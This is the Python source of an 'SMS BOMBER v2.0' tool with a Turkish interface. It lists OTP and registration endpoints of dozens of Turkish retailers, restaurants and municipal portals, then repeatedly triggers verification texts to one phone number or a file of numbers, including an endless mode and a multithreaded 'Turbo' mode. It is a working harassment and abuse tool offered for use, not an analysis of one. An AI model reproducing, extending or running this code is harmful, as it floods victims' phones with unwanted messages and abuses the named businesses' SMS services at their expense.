from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
import requests
import threading

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)


def check_service_connection(service_name):
    """Servis bağlantısını kontrol et (SMS göndermeden)"""
    try:
        # Servislere özel bağlantı testleri
        if service_name == "KahveDunyasi":
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"countryCode": "90", "phoneNumber": "5554443322"}
            r = requests.post(url, headers=headers, json=json, timeout=3)
            return r.status_code == 200
            
        elif service_name == "Wmf":
            url = "https://www.wmf.com.tr/users/register/"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Bim":
            url = "https://bim.veesk.net:443/service/v1.0/account/login"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Englishhome":
            url = "https://www.englishhome.com:443/api/member/sendOtp"
            r = requests.get("https://www.englishhome.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Suiste":
            url = "https://suiste.com:443/api/auth/code"
            r = requests.get("https://suiste.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "KimGb":
            url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Evidea":
            url = "https://www.evidea.com:443/users/register/"
            r = requests.get("https://www.evidea.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Ucdortbes":
            url = "https://api.345dijital.com:443/api/users/register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "TiklaGelsin":
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Naosstars":
            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
            r = requests.get("https://api.naosstars.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Koton":
            url = "https://www.koton.com:443/users/register/"
            r = requests.get("https://www.koton.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Hayatsu":
            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
            r = requests.get("https://www.hayatsu.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Hizliecza":
            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Metro":
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "File":
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Akasya":
            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Akbati":
            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Komagene":
            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
            r = requests.get("https://www.komagene.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Porty":
            url = "https://panel.porty.tech:443/api.php?"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Tasdelen":
            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Uysal":
            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Yapp":
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "YilmazTicaret":
            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Beefull":
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Dominos":
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Baydoner":
            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Pidem":
            url = "https://restashop.azurewebsites.net:443/graphql/"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Frink":
            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Bodrum":
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "KofteciYusuf":
            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Little":
            url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Orwi":
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Coffy":
            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Hamidiye":
            url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Fatih":
            url = "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet"
            r = requests.get("https://ebelediye.fatih.bel.tr", timeout=3, verify=False)
            return r.status_code < 500
            
        elif service_name == "Sancaktepe":
            url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet"
            r = requests.get("https://e-belediye.sancaktepe.bel.tr", timeout=3, verify=False)
            return r.status_code < 500
            
        elif service_name == "Bayrampasa":
            url = "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet"
            r = requests.get("https://ebelediye.bayrampasa.bel.tr", timeout=3, verify=False)
            return r.status_code < 500
            
        elif service_name == "Money":
            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
            r = requests.get("https://www.money.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Alixavien":
            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
            r = requests.get("https://www.alixavien.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Jimmykey":
            url = "https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms"
            r = requests.get("https://www.jimmykey.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Ido":
            url = "https://api.ido.com.tr:443/idows/v2/register"
            r = requests.get("https://www.ido.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Tazi":
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Hey":
            url = "https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Bisu":
            url = "https://www.bisu.com.tr:443/api/v2/app/authentication/phone/register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Macro":
            url = "https://www.macrocenter.com.tr:443/rest/users/register/otp"
            r = requests.get("https://www.macrocenter.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Ayyildiz":
            url = "https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Istegelsin":
            url = "https://prod.fasapi.net:443/"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Ipragaz":
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Qumpara":
            url = "https://tr-api.fisicek.com:443/v1.3/auth/getOTP"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Paybol":
            url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Migros":
            url = "https://rest.migros.com.tr:443/sanalmarket/users/register/otp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Joker":
            url = "https://api.joker.com.tr:443/api/register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Clickme":
            url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Happy":
            url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
            r = requests.get("https://www.happy.com.tr", timeout=3)
            return r.status_code < 500
            
        elif service_name == "KuryemGelsin":
            url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Taksim":
            url = "https://service.taksim.digital:443/services/PassengerRegister/Register"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Tasimacim":
            url = "https://server.tasimacim.com/requestcode"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "ToptanTeslim":
            url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
            r = requests.get("https://toptanteslim.com", timeout=3)
            return r.status_code < 500
            
        elif service_name == "Yuffi":
            url = "https://api.yuffi.co/api/parent/login/user"
            r = requests.get(url, timeout=3)
            return r.status_code < 500
            
        elif service_name == "Starbucks":
            url = "https://auth.sbuxtr.com:443/signUp"
            r = requests.get(url, timeout=3)
            return r.status_code < 500

        # Diğer servisler için genel kontrol
        return False
        
    except Exception as e:
        return False

art = """
  ____                      _  _    ___   ___  
 |  _ \ _   _ _______ _   _| || |  ( _ ) / _ \ 
 | | | | | | |_  / __| | | | || |_ / _ \| | | |
 | |_| | |_| |/ / (__| |_| |__   _| (_) | |_| |
 |____/ \__,_/___\___|\__,_|  |_|  \___/ \___/ 
 / ___| _ __ ___  ___                          
 \___ \| '_ ` _ \/ __|                         
  ___) | | | | | \__ \                         
 |____/|_| |_| |_|___/   
"""

def check_all_services():
    """Tüm servislerin durumunu kontrol eder"""
    system("cls||clear")
    print(f"{Fore.LIGHTCYAN_EX}Servis Durumları Kontrol Ediliyor...{Style.RESET_ALL}\n")
    
    active_services = 0
    total_services = len(servisler_sms)
    
    for service_name in servisler_sms:
        if service_name not in ["check_service_status", "__init__"]:
            try:
                status = check_service_connection(service_name)
                if status:
                    print(f"{Fore.LIGHTGREEN_EX}[AÇIK] {Style.RESET_ALL}{service_name}")
                    active_services += 1
                else:
                    print(f"{Fore.LIGHTRED_EX}[KAPALI] {Style.RESET_ALL}{service_name}")
            except Exception as e:
                print(f"{Fore.LIGHTRED_EX}[HATA] {Style.RESET_ALL}{service_name}")
    
    print(f"\n{Fore.LIGHTCYAN_EX}Toplam: {active_services}/{total_services} servis aktif{Style.RESET_ALL}")
    print(f"\n{Fore.LIGHTYELLOW_EX}Menüye dönmek için 'enter' tuşuna basınız...{Style.RESET_ALL}")
    input()

while 1:
    system("cls||clear")                     
    print(f"""
{Fore.BLUE +  Style.BRIGHT + Style.DIM + art + Style.RESET_ALL}
{Fore.CYAN}╔══════════════════════════════════╗
{Fore.CYAN}║    {Fore.YELLOW}🚀 SMS BOMBER v2.0 {Fore.CYAN}           ║
{Fore.CYAN}╠══════════════════════════════════╣
{Fore.WHITE}║  {Fore.GREEN}1.{Style.RESET_ALL} 📱 Tek Numara SMS            {Fore.CYAN}║ 
{Fore.WHITE}║  {Fore.GREEN}2.{Style.RESET_ALL} ⚡ Turbo Mod                 {Fore.CYAN}║
{Fore.WHITE}║  {Fore.GREEN}3.{Style.RESET_ALL} 📊 Servis Kontrol            {Fore.CYAN}║
{Fore.WHITE}║  {Fore.RED}0.{Style.RESET_ALL} ❌ Çıkış                     {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════╝
{Fore.LIGHTBLUE_EX + Style.BRIGHT} Sms : 238
{Fore.LIGHTRED_EX + Style.BRIGHT} İnstagram/Github : Duzcu480
{Style.RESET_ALL}""")
    print(Fore.LIGHTYELLOW_EX + "Seçiminiz: "+ Fore.LIGHTGREEN_EX, end="")
    try:
        menu = input()
        if menu == "":
            continue
        menu = int(menu)
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: "+ Fore.LIGHTGREEN_EX, end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.")
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.")
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
            sleep(3)
            continue
        system("cls||clear")
        if kere is None:
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms."+attribute+"()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                    while sms.adet < kere:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == kere:
                                        break
                                    exec("sms."+attribute+"()")
                                    sleep(aralik)
        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
        input()
    elif menu == 0:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.")
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.")
            sleep(3)
            continue
        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        dur = threading.Event()
        def Turbo():
            while not dur.is_set():
                thread = []
                for fonk in servisler_sms:
                    t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                    thread.append(t)
                    t.start()
                for t in thread:
                    t.join()
        try:
            Turbo()
        except KeyboardInterrupt:
            dur.set()
            system("cls||clear")
            print("\nCtrl+C tuş kombinasyonu algılandı. Menüye dönülüyor..")
            sleep(2)
    elif menu == 3:
        check_all_services()
